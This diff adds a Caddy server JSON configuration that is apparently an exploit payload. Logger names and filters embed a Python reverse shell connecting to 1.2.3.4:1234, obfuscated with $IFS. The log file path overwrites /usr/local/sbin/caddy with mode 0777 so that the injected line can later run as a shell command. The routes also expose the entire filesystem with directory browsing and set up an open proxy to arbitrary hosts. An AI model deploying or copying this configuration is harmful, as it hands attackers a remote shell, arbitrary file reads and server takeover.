@@ -1,0 +1,242 @@
+{
+  "logging": {
+    "logs": {
+      "default": {
+        "level": "DEBUG",
+        "exclude": [
+          "http.log.access.kek\n\npython$IFS-c$IFS'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"1.2.3.4\",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n\nkek"
+        ]
+      },
+      "kek\n\npython$IFS-c$IFS'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"1.2.3.4\",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n\nkek": {
+        "writer": {
+          "filename": "/usr/local/sbin/caddy",
+          "mode": "0777",
+          "output": "file"
+        },
+        "encoder": {
+          "format": "filter",
+          "wrap": {
+            "format": "console"
+          }
+        },
+        "level": "DEBUG",
+        "include": [
+          "http.log.access.kek\n\npython$IFS-c$IFS'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"1.2.3.4\",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n\nkek"
+        ]
+      }
+    }
+  },
+  "apps": {
+    "http": {
+      "servers": {
+        "srv0": {
+          "listen": [
+            ":80"
+          ],
+          "routes": [
+            {
+              "group": "group4",
+              "match": [
+                {
+                  "path": [
+                    "/files/*"
+                  ]
+                }
+              ],
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "handle": [
+                        {
+                          "handler": "rewrite",
+                          "strip_path_prefix": "/files"
+                        }
+                      ]
+                    },
+                    {
+                      "handle": [
+                        {
+                          "handler": "vars",
+                          "root": "/"
+                        },
+                        {
+                          "browse": {},
+                          "handler": "file_server",
+                          "hide": [
+                            "./caddyfile_read"
+                          ],
+                          "root": "/"
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "group": "group4",
+              "match": [
+                {
+                  "path": [
+                    "/log"
+                  ]
+                }
+              ],
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "handle": [
+                        {
+                          "handler": "rewrite",
+                          "strip_path_prefix": "/log"
+                        }
+                      ]
+                    },
+                    {
+                      "handle": [
+                        {
+                          "body": "'kek'",
+                          "handler": "static_response"
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "group": "group4",
+              "match": [
+                {
+                  "path": [
+                    "/"
+                  ]
+                }
+              ],
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "handle": [
+                        {
+                          "handler": "rewrite",
+                          "strip_path_prefix": "/"
+                        }
+                      ]
+                    },
+                    {
+                      "handle": [
+                        {
+                          "handler": "vars",
+                          "root": "./"
+                        },
+                        {
+                          "handler": "file_server",
+                          "hide": [
+                            "./caddyfile_read"
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "group": "group4",
+              "match": [
+                {
+                  "path": [
+                    "/*"
+                  ]
+                }
+              ],
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "handle": [
+                        {
+                          "handler": "rewrite"
+                        }
+                      ]
+                    },
+                    {
+                      "handle": [
+                        {
+                          "defaults": [
+                            "{http.regexp.stripHostPort.1}:{http.regexp.stripHostPort.2}"
+                          ],
+                          "destinations": [
+                            "{proxyHostname}"
+                          ],
+                          "handler": "map",
+                          "mappings": [
+                            {
+                              "input": "80",
+                              "outputs": [
+                                "{http.regexp.stripHostPort.1}"
+                              ]
+                            }
+                          ],
+                          "source": "{http.regexp.stripHostPort.2}"
+                        }
+                      ]
+                    },
+                    {
+                      "group": "group3",
+                      "handle": [
+                        {
+                          "handler": "rewrite",
+                          "uri": "{http.regexp.stripHostPort.3}"
+                        }
+                      ],
+                      "match": [
+                        {
+                          "path_regexp": {
+                            "name": "stripHostPort",
+                            "pattern": "^\\/(?:[a-z]+:\\/\\/)?([^\\/]+?)(?::(\\d+))?(\\/.*)?$"
+                          }
+                        }
+                      ]
+                    },
+                    {
+                      "handle": [
+                        {
+                          "handler": "reverse_proxy",
+                          "headers": {
+                            "request": {
+                              "set": {
+                                "Host": [
+                                  "{proxyHostname}"
+                                ]
+                              }
+                            }
+                          },
+                          "upstreams": [
+                            {
+                              "dial": "{http.regexp.stripHostPort.1}:{http.regexp.stripHostPort.2}"
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "logs": {
+            "default_logger_name": "kek\n\npython$IFS-c$IFS'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"1.2.3.4\",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n\nkek"
+          }
+        }
+      }
+    }
+  }
+}
